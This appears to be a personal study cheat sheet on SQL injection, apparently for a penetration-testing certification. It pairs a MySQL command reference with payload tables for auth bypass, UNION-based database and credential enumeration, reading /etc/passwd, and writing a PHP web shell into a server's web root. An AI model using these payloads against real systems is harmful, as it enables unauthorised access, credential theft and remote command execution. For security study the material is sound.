---
layout: post
title: "SQL Injection Fundementals"
date: 2025-04-22
categories: CheatSheets/CPTS
order: 13
---

## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

---

## SQL Injection

### Auth Bypass
| **Payload**                   | **Description**                        |
|-------------------------------|----------------------------------------|
| ``admin' OR '1'='1``          | Basic auth bypass                      |
| ``admin')-- -``               | Basic auth bypass (with SQL comment)   |
| **Reference**                 | [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |

### Union Injection
| **Payload**                                               | **Description**                                   |
|-----------------------------------------------------------|---------------------------------------------------|
| ``' ORDER BY 1-- -``                                      | Detect number of columns via `ORDER BY`           |
| ``cn' UNION SELECT 1,2,3-- -``                            | Test UNION injection, discover column count       |
| ``cn' UNION SELECT 1,@@version,3,4-- -``                  | Basic UNION injection showing MySQL version       |
| ``UNION SELECT username,2,3,4 FROM passwords-- -``        | Extract usernames (4‑column UNION)                |

### DB Enumeration
| **Payload**                                                                                              | **Description**                                  |
|----------------------------------------------------------------------------------------------------------|--------------------------------------------------|
| ``SELECT @@version``                                                                                     | Fingerprint MySQL and return version string      |
| ``SELECT SLEEP(5)``                                                                                      | Fingerprint MySQL via time delay                 |
| ``cn' UNION SELECT 1,database(),2,3-- -``                                                                 | Retrieve current database name                   |
| ``cn' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -``                              | List all databases                               |
| ``cn' UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables WHERE table_schema='dev'-- -`` | List tables in the `dev` database                |
| ``cn' UNION SELECT 1,column_name,table_name,table_schema FROM information_schema.columns WHERE table_name='credentials'-- -`` | List columns in the `credentials` table          |
| ``cn' UNION SELECT 1,username,password,4 FROM dev.credentials-- -``                                      | Dump all rows from `dev.credentials`             |

### Privileges
| **Payload**                                                                                                              | **Description**                                              |
|--------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------|
| ``cn' UNION SELECT 1,user(),3,4-- -``                                                                                     | Show current MySQL user                                       |
| ``cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -``                                              | Check if `root` has SUPER privileges                         |
| ``cn' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges WHERE user='root'-- -`` | List all privileges granted to `root`                        |
| ``cn' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -`` | Show MySQL’s secure_file_priv setting (allowed file paths)   |

### File Injection
| **Payload**                                                                                                                          | **Description**                         |
|--------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------|
| ``cn' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -``                                                                               | Read the `/etc/passwd` file             |
| ``SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'``                                                        | Write a string into a server‑side file  |
| ``cn' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '' INTO OUTFILE '/var/www/html/shell.php'-- -``                           | Drop a PHP web shell into the web root  |

---